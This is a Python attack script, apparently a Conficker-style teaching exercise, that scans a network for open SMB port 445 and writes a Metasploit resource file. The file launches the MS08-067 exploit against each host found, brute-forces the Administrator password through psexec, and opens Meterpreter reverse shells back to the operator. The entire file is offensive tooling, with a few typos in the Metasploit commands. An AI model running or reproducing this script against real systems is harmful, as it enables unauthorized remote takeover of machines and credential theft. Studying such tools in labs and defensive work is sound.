#!/usr/bin/python
# -*- coding:utf-8 -*-
# TCP 445 端口主要是作为 SMB 协议的默认端口
import os
import optparse
import sys
import nmap


def find_tgts(sun_net):
    nm_scan = nmap.PortScanner()
    nm_scan.scan(sun_net, '445')
    tgt_hosts = []
    for host in nm_scan.all_hosts():
        if nm_scan[host].has_tcp(445):
            state = nm_scan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Found Target Host: ' + host)
                tgt_hosts.append(host)
    return tgt_hosts


def setup_handler(config_file, lhost, lport):
    config_file.write('user exploit/multi/handler\n')
    config_file.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('set LHOST ' + str(lhost) + '\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')


def conficker_exploit(config_file, tgt_host, lhost, lport):
    config_file.write('user exploit/windows/smb/ms08_067_netapi\n')
    config_file.write('set RHOST ' + str(tgt_host) + '\n')
    config_file.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('set LHOST ' + str(lhost) + '\n')
    config_file.write('exploit -j -z\n')


def smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    username = 'Administrator'
    with open(passwd_file, 'r') as pf:
        for password in pf.readlines():
            password = password.strip('\n').strip('\r')
            config_file.write('use exploit/windows/smb/psexec\n')
            config_file.write('set SMBUser ' + str(username) + '\n')
            config_file.write('set SMBPass ' + str(password) + '\n')
            config_file.write('set PHOST ' + str(tgt_host) + '\n')
            config_file.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
            config_file.write('set LPORT ' + str(lport) + '\n')
            config_file.write('set LHOST ' + str(lhost) + '\n')
            config_file.write('exploit -j - z\n')


def main():
    with open('meta.rc', 'w') as config_file:
        parser = optparse.OptionParser('[-] Usage%prog -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
        parser.add_option('-H', dest='tgt_host', type='string', help='specify the target address[es]')
        parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
        parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
        parser.add_option('-F', dest='password_file', type='string', help='password file for SMB brute force attempt')
        (options, args) = parser.parse_args()
        if options.tgt_host is None or options.lhost is None:
            print(parser.usage)
            exit(0)
        lhost = options.lhost
        lport = options.lport
        if lport is None:
            lport = '1337'
        password_file = options.password_file
        tgt_hosts = find_tgts(options.tgt_host)
        setup_handler(config_file, lhost, lport)
        for tgt_host in tgt_hosts:
            conficker_exploit(config_file, tgt_host, lhost, lport)
            if password_file is not None:
                smb_brute(config_file, tgt_host, password_file, lhost, lport)
        config_file.close()
        os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()
